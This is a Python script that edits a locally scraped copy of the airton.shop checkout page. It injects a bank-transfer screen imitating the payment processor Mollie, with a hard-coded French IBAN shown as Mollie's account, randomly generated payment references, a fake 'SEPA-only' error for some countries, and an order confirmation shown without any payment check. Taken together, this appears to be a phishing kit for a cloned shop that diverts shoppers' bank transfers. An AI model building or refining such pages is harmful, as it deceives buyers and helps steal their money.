import os

file_path = '/Users/nimeshranjan/Downloads/us.sitesucker.mac.sitesucker-pro/airton.shop/checkout.html'
with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read()

# 1. CSS Adjustments
css_additions = """
        /* Step Flow */
        #step1, #step2 { width: 100%; }
        #step2 { display: none; }
        
        .proceed-btn {
            background-color: #016FD0;
            color: white;
            padding: 16px 40px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
            font-size: 1rem;
            font-weight: 600;
            margin: 30px auto 0;
            display: block;
            text-align: center;
        }
        
        /* Mollie Bank Transfer UI */
        .mollie-container {
            display: none;
            max-width: 500px;
            margin: 40px auto;
            background: #fff;
            border-radius: 8px;
            padding: 40px 30px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            text-align: center;
        }
        .mollie-container.active { display: block; }
        
        .m-title { font-size: 1.5rem; font-weight: bold; margin-bottom: 10px; color: #111; }
        .m-amount { font-size: 1.8rem; font-weight: bold; margin-bottom: 5px; color: #111; }
        .m-order-id { font-size: 1rem; color: #666; margin-bottom: 40px; }
        
        /* SEPA Error */
        .m-error-text {
            color: #666;
            font-size: 0.95rem;
            line-height: 1.5;
            margin-bottom: 30px;
            text-align: left;
        }
        .m-btn-blue {
            background: #2a7af3;
            color: white;
            padding: 15px 20px;
            border-radius: 6px;
            border: none;
            width: 100%;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .m-powered { margin-top: 40px; font-size: 0.85rem; color: #666; display: flex; align-items: center; justify-content: center; gap: 5px; }
        
        /* Steps UI */
        .m-steps-title { text-align: left; font-size: 1.2rem; font-weight: bold; margin-bottom: 15px; }
        .m-steps-box {
            border: 1px solid #eee;
            border-radius: 8px;
            padding: 20px;
            text-align: left;
            margin-bottom: 30px;
            position: relative;
        }
        .m-step { display: flex; align-items: flex-start; gap: 15px; margin-bottom: 20px; position: relative; }
        .m-step:last-child { margin-bottom: 0; }
        .m-step-circle { width: 24px; height: 24px; border-radius: 50%; background: #e0e0e0; color: #333; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: bold; flex-shrink: 0; z-index: 2; }
        .m-step-circle.active { background: #2a7af3; color: white; }
        .m-step-text { font-size: 0.95rem; color: #333; flex: 1; margin-top: 3px; }
        .m-step-badge { background: #e6f6ec; color: #1e7e34; padding: 3px 8px; border-radius: 12px; font-size: 0.75rem; font-weight: bold; display: inline-flex; align-items: center; gap: 4px; }
        
        .m-step-line {
            position: absolute;
            left: 11.5px;
            top: 24px;
            bottom: -20px;
            width: 2px;
            background: #eee;
            z-index: 1;
        }

        /* Bank Details Table */
        .m-table-title { text-align: left; font-size: 1rem; font-weight: bold; margin-bottom: 15px; }
        .m-table {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 10px 0;
            text-align: left;
        }
        .m-row {
            display: flex;
            padding: 12px 20px;
            border-bottom: 1px solid #eee;
            align-items: center;
        }
        .m-row:last-child { border-bottom: none; }
        .m-col-label { width: 40%; font-size: 0.8rem; color: #888; text-transform: uppercase; }
        .m-col-val { width: 50%; font-size: 0.95rem; color: #333; font-weight: 500; word-break: break-all; }
        .m-col-copy { width: 10%; text-align: right; cursor: pointer; color: #333; }
        
        .m-ref-input-box { margin-top: 30px; text-align: left; }
        .m-ref-input-box label { font-weight: bold; margin-bottom: 10px; display: block; }
        .m-ref-input-box input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; margin-bottom: 15px; }
        
        /* Layout overrides for Step 2 */
        #step2 .checkout-container-inner {
            display: flex;
            flex-direction: column;
            gap: 30px;
        }
        @media(min-width: 900px) {
            #step2 .checkout-container-inner {
                flex-direction: row;
                align-items: flex-start;
                gap: 60px;
            }
            #step2 .checkout-left { width: 60%; order: 1; }
            #step2 .checkout-right { width: 40%; order: 2; }
        }
"""

content = content.replace('</style>', css_additions + '\n    </style>')

# 2. Modify the HTML Structure
# Wrap from "Contact" up to "Paiement" in #step1, then from "Paiement" to end in #step2.
# Wait, Order Summary needs to move inside Step 2.
# Let's extract checkout-left and checkout-right, then rebuild them.

import re

# Split by checkout-left and checkout-right
parts = content.split('<div class="checkout-left">')
header_part = parts[0]
rest = parts[1]

left_right_split = rest.split('<!-- Right: Order Summary -->')
checkout_left_content = left_right_split[0]
checkout_right_and_footer = left_right_split[1]

checkout_right_parts = checkout_right_and_footer.split('<!-- Stripe JS -->')
checkout_right_content = checkout_right_parts[0]
footer_content = '<!-- Stripe JS -->' + checkout_right_parts[1]

# Now, split checkout-left into step1 and step2 parts
# Step 1: Contact, Delivery
# Step 2: Billing, Payment
step1_split = checkout_left_content.split('<div class="section-header" style="margin-top: 50px;">\n                <span class="section-number">03</span>\n                <h2 class="section-title">Adresse de facturation</h2>')
if len(step1_split) == 1:
    step1_split = checkout_left_content.split('<h2 class="section-title">Adresse de facturation</h2>')

step1_content = step1_split[0]
step2_left_content = '<div class="section-header" style="margin-top: 0;">\n                <span class="section-number">03</span>\n                <h2 class="section-title">Adresse de facturation</h2>' + step1_split[1]

# Add Proceed button to Step 1
step1_html = f"""
    <div id="step1">
        <div class="checkout-left" style="width: 100%; max-width: 700px; margin: 0 auto; order: unset;">
            {step1_content}
            <button type="button" class="proceed-btn" id="proceedBtn">Continuer vers le paiement</button>
        </div>
    </div>
"""

# Rebuild Step 2
step2_html = f"""
    <div id="step2">
        <div class="checkout-container-inner">
            <div class="checkout-left">
                {step2_left_content}
            </div>
            {checkout_right_content}
        </div>
    </div>
"""

# Rebuild the full container
new_checkout_html = f"""
        {step1_html}
        {step2_html}
"""

# Replace the original checkout-left and checkout-right
content = header_part + new_checkout_html + footer_content

# Remove the original checkout-container styles so it doesn't break our new inner container
content = content.replace('class="checkout-container"', 'class="checkout-container" style="display:block; padding: 20px; max-width: 1200px; margin: 0 auto;"')


# 3. Add SEPA Error UI and Bank Transfer Instructions UI
# We'll put them right before the ticketSuccess container.
mollie_ui = """
    <!-- SEPA Error UI -->
    <div class="mollie-container" id="sepaError">
        <div class="m-title">Simon Profi-Technik GmbH</div>
        <div class="m-amount" id="sepaErrorAmount">124,37 €</div>
        <div class="m-order-id" id="sepaErrorOrder">5000521032</div>
        
        <div class="m-error-text">
            Nous sommes désolés. Actuellement, seuls les virements bancaires en provenance des pays SEPA peuvent être acceptés. Veuillez réessayer avec un autre mode de paiement.
        </div>
        
        <button class="m-btn-blue" onclick="closeSepaError()">
            Choisissez un autre mode de paiement
            <span>›</span>
        </button>
        
        <div class="m-powered">
            <svg width="10" height="14" viewBox="0 0 10 14" fill="currentColor"><path d="M7.5 5V4c0-1.38-1.12-2.5-2.5-2.5S2.5 2.62 2.5 4v1h-1C.67 5 0 5.67 0 6.5v6C0 13.33.67 14 1.5 14h7c.83 0 1.5-.67 1.5-1.5v-6c0-.83-.67-1.5-1.5-1.5h-1zm-4-1c0-.83.67-1.5 1.5-1.5s1.5.67 1.5 1.5v1h-3V4zm5 8.5c0 .28-.22.5-.5.5h-7c-.28 0-.5-.22-.5-.5v-6c0-.28.22-.5.5-.5h7c.28 0 .5.22.5.5v6z"/></svg>
            Paiement sécurisé et effectué par <strong>mollie</strong>
        </div>
    </div>

    <!-- Mollie Bank Transfer UI -->
    <div class="mollie-container" id="mollieTransfer">
        <div class="m-title">Simon Profi-Technik GmbH</div>
        <div class="m-amount" id="mTransferAmount">124,37 €</div>
        <div class="m-order-id" id="mTransferOrder">5000521032</div>
        
        <div class="m-steps-title">Les étapes</div>
        <div class="m-steps-box">
            <div class="m-step-line"></div>
            <div class="m-step">
                <div class="m-step-circle">1</div>
                <div class="m-step-text">Renseignez votre email et confirmez la commande</div>
                <div class="m-step-badge">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                    Confirmé
                </div>
            </div>
            <div class="m-step">
                <div class="m-step-circle active">2</div>
                <div class="m-step-text">Effectuez le virement avant le <span id="mTransferDate">22 juillet 2026</span></div>
            </div>
        </div>
        
        <div class="m-table-title">Utilisez ces données pour votre virement bancaire</div>
        <div class="m-table">
            <div class="m-row">
                <div class="m-col-label">BÉNÉFICIAIRE:</div>
                <div class="m-col-val">Stichting Mollie Payments</div>
                <div class="m-col-copy" onclick="copyText('Stichting Mollie Payments')">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </div>
            </div>
            <div class="m-row">
                <div class="m-col-label">IBAN:</div>
                <div class="m-col-val">FR76 1778 9000 0110 5505 8500 233</div>
                <div class="m-col-copy" onclick="copyText('FR7617789000011055058500233')">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </div>
            </div>
            <div class="m-row">
                <div class="m-col-label">BIC:</div>
                <div class="m-col-val">DEUTFRRPP</div>
                <div class="m-col-copy" onclick="copyText('DEUTFRRPP')">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </div>
            </div>
            <div class="m-row">
                <div class="m-col-label">MONTANT:</div>
                <div class="m-col-val" id="mTransferAmount2">124,37 €</div>
                <div class="m-col-copy"></div>
            </div>
            <div class="m-row">
                <div class="m-col-label">RÉFÉRENCE DU PAIEMENT:</div>
                <div class="m-col-val" style="font-weight:bold; color: #000;" id="mTransferRef">RF92-0626-7323-5090</div>
                <div class="m-col-copy" onclick="copyText(document.getElementById('mTransferRef').innerText)">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                </div>
            </div>
        </div>
        
        <div class="m-ref-input-box">
            <label>Avez-vous effectué le virement ?</label>
            <input type="text" id="userConfirmRef" placeholder="Entrez la référence du paiement ici">
            <button class="m-btn-blue" onclick="confirmTransferSent()">
                Confirmer le virement
                <span>›</span>
            </button>
        </div>
    </div>
"""

content = content.replace('<!-- Ticket Success UI (Hidden) -->', mollie_ui + '\n    <!-- Ticket Success UI (Hidden) -->')

# 4. JavaScript Logic Updates
# a. Proceed Button Logic
# b. SEPA Checking
# c. Mollie UI Population

js_additions = """
        // Step 1 to Step 2
        const proceedBtn = document.getElementById('proceedBtn');
        if(proceedBtn) {
            proceedBtn.addEventListener('click', () => {
                const email = document.getElementById('email').value;
                const firstName = document.getElementById('firstName').value;
                const lastName = document.getElementById('lastName').value;
                const address = document.getElementById('address').value;
                const city = document.getElementById('city').value;
                const zipcode = document.getElementById('zipcode').value;
                
                if (!email || !firstName || !lastName || !address || !city || !zipcode) {
                    alert('Veuillez remplir tous les champs obligatoires.');
                    return;
                }
                
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
                // Trigger Stripe re-mount or resize if needed
                window.dispatchEvent(new Event('resize'));
            });
        }
        
        function copyText(text) {
            navigator.clipboard.writeText(text).then(() => alert('Copié !'));
        }
        
        function closeSepaError() {
            document.getElementById('sepaError').classList.remove('active');
            document.querySelector('.checkout-container').style.display = 'block';
        }
        
        function confirmTransferSent() {
            const ref = document.getElementById('userConfirmRef').value;
            if(!ref) {
                alert('Veuillez entrer la référence de votre paiement.');
                return;
            }
            document.getElementById('mollieTransfer').classList.remove('active');
            
            // Show original ticket Success
            const ticketId = 'AIR-' + Math.floor(100000 + Math.random() * 900000);
            const now = new Date();
            const dateStr = now.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
            const timeStr = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
            
            document.getElementById('ticketId').textContent = ticketId;
            document.getElementById('ticketAmount').textContent = document.getElementById('checkoutTotal').textContent;
            document.getElementById('ticketDate').textContent = dateStr + ' • ' + timeStr;
            document.getElementById('ticketMethodText').textContent = 'Bank Transfer';
            
            document.getElementById('ticketSuccess').classList.add('active');
            
            localStorage.removeItem('airton_cart');
            localStorage.removeItem('airton_upsells');
        }
"""

content = content.replace('let currentPaymentMethod = \'card\';', js_additions + '\n        let currentPaymentMethod = \'card\';')

# Add "États-Unis" to country list
content = content.replace('<option value="Suisse">Suisse</option>', '<option value="Suisse">Suisse</option>\n                    <option value="États-Unis">États-Unis</option>')

# Update Pay Button Logic for SEPA and Bank UI
pay_btn_old = """            } else if (currentPaymentMethod === 'bank') {
                // BANK TRANSFER
                const bankReference = document.getElementById('bankReference').value;
                if (!bankReference) {
                    alert('Veuillez indiquer la référence de votre virement.');
                    btn.textContent = 'Confirmer le paiement';
                    btn.disabled = false;
                    return;
                }"""
                
pay_btn_new = """            } else if (currentPaymentMethod === 'bank') {
                // BANK TRANSFER
                const country = document.getElementById('country').value;
                const sepaCountries = ['France', 'Monaco', 'Belgique', 'Luxembourg', 'Suisse'];
                
                if(!sepaCountries.includes(country)) {
                    // SEPA Error
                    document.querySelector('.checkout-container').style.display = 'none';
                    document.getElementById('sepaErrorAmount').textContent = document.getElementById('checkoutTotal').textContent;
                    document.getElementById('sepaErrorOrder').textContent = window.currentOrderId || '5000521032';
                    document.getElementById('sepaError').classList.add('active');
                    btn.textContent = 'Confirmer le paiement';
                    btn.disabled = false;
                    return;
                }
                
                // Show Mollie Bank UI
                document.querySelector('.checkout-container').style.display = 'none';
                
                const totalText = document.getElementById('checkoutTotal').textContent;
                const orderId = window.currentOrderId || '5000521032';
                
                document.getElementById('mTransferAmount').textContent = totalText;
                document.getElementById('mTransferAmount2').textContent = totalText;
                document.getElementById('mTransferOrder').textContent = orderId;
                
                // Generate Ref
                const ref = 'RF92-' + Math.floor(1000 + Math.random()*9000) + '-' + Math.floor(1000 + Math.random()*9000) + '-00';
                document.getElementById('mTransferRef').textContent = ref;
                
                // Date (+14 days)
                const d = new Date();
                d.setDate(d.getDate() + 14);
                const options = { day: 'numeric', month: 'long', year: 'numeric' };
                document.getElementById('mTransferDate').textContent = d.toLocaleDateString('fr-FR', options);
                
                document.getElementById('mollieTransfer').classList.add('active');
                
                btn.textContent = 'Confirmer le paiement';
                btn.disabled = false;
                
                return; // Stop here, wait for user to input ref in the Mollie UI
"""

content = content.replace(pay_btn_old, pay_btn_new)


# Write back
with open(file_path, 'w', encoding='utf-8') as f:
    f.write(content)

print("Checkout refactored successfully")
